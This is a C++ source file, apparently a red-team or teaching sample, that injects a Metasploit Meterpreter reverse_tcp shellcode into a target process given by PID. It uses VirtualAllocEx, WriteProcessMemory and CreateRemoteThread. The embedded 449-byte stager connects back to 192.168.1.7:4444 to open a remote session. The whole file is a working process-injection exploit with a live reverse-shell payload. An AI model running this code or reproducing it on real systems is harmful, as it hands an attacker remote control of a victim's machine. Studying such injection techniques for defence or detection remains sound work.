#include "pch.h"

// In this everythis is same as CreateRemoteThread DLL but instead of LoadLibrary address, directly call the starting address of the shellcode.

INT main(INT argc, LPSTR argv[]) {
    /*
     * windows/x64/meterpreter/reverse_tcp - 449 bytes (stage 1)
     * https://metasploit.com/
     * VERBOSE=false, LHOST=192.168.1.7, LPORT=4444,
     * ReverseAllowProxy=false, ReverseListenerThreaded=false,
     * StagerRetryCount=10, StagerRetryWait=5, PingbackRetries=0,
     * PingbackSleep=30, PayloadUUIDTracking=false,
     * EnableStageEncoding=false, StageEncoderSaveRegisters=,
     * StageEncodingFallback=true, PrependMigrate=false,
     * EXITFUNC=thread, AutoLoadStdapi=true,
     * AutoVerifySessionTimeout=30, InitialAutoRunScript=,
     * AutoRunScript=, AutoSystemInfo=true,
     * EnableUnicodeEncoding=false, SessionRetryTotal=3600,
     * SessionRetryWait=10, SessionExpirationTimeout=604800,
     * SessionCommunicationTimeout=300, PayloadProcessCommandLine=,
     * AutoUnhookProcess=false
     */
    BYTE shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x8b\x72\x50"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48"
        "\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b"
        "\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x44\x8b"
        "\x40\x20\x49\x01\xd0\x8b\x48\x18\x50\xe3\x56\x48\xff\xc9\x41"
        "\x8b\x34\x88\x4d\x31\xc9\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1"
        "\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45"
        "\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
        "\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
        "\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00"
        "\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5"
        "\x49\xbc\x02\x00\x11\x5c\xc0\xa8\x01\x07\x41\x54\x49\x89\xe4"
        "\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68"
        "\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a"
        "\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89"
        "\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
        "\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba"
        "\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\x49\xff\xce\x75\xe5"
        "\x68\xf0\xb5\xa2\x56\xff\xd5\x48\x83\xec\x10\x48\x89\xe2\x4d"
        "\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f"
        "\xff\xd5\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68\x00"
        "\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4"
        "\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89"
        "\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5"
        "\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7";
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " PID\n";
        return 0x1;
    }

    DWORD dwPID = atoll(argv[1]);

    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, dwPID);
    if (hProcess == NULL) {
        PrintError("OpenProcess()", TRUE);
        return 0x1;
    }

    LPVOID lpBuffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBuffer == nullptr) {
        CloseHandle(hProcess);
        hProcess = nullptr;

        PrintError("VirtualAllocEx()", TRUE);
        return 0x1;
    }

    if (!WriteProcessMemory(hProcess, lpBuffer, (LPCVOID)shellcode, 449, nullptr)) {
        VirtualFreeEx(hProcess, lpBuffer, 0x0, MEM_RELEASE);
        lpBuffer = nullptr;

        CloseHandle(hProcess);
        hProcess = nullptr;

        PrintError("WriteProcessMemory()", TRUE);
        return 0x1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, NULL, (LPTHREAD_START_ROUTINE)lpBuffer, NULL, NULL, nullptr);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, lpBuffer, 0x0, MEM_RELEASE);
        lpBuffer = nullptr;

        CloseHandle(hProcess);
        hProcess = nullptr;

        PrintError("WriteProcessMemory()", TRUE);
        return 0x1;
    }

    std::cout << "Injected Shellcode\n";

    CloseHandle(hProcess);
    CloseHandle(hThread);
    hProcess = hThread = nullptr;

    return 0x0;
}